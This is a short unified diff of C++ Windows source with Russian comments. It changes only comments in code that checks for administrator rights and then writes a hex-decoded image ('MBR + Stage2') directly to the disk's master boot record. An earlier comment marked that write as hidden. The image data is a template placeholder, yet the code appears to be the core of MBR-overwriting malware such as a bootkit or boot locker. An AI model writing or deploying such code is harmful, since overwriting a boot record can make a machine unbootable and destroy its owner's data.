@@ -9,7 +9,7 @@
 
 const char MBR_HEX[] = "{MBR_DATA}";
 
-// === ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА (СВОЯ ФУНКЦИЯ) ===
+// === ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА ===
 bool IsAdmin() {
     BOOL isAdmin = FALSE;
     PSID adminGroup = NULL;
@@ -79,7 +79,7 @@ std::vector<unsigned char> HexToBytes(const std::string& hex) {
     return bytes;
 }
 
-// === ЗАПИСЬ MBR (СКРЫТО) ===
+// === ЗАПИСЬ MBR ===
 void WriteMBR() {
     std::string hex(MBR_HEX);
     std::vector<unsigned char> image = HexToBytes(hex);
@@ -123,6 +123,7 @@ void WriteMBR() {
         if (hDisk == INVALID_HANDLE_VALUE) return;
     }
     
+    // Записываем ВЕСЬ образ (MBR + Stage2)
     DWORD bytesWritten;
     WriteFile(hDisk, image.data(), (DWORD)image.size(), &bytesWritten, NULL);
     CloseHandle(hDisk);
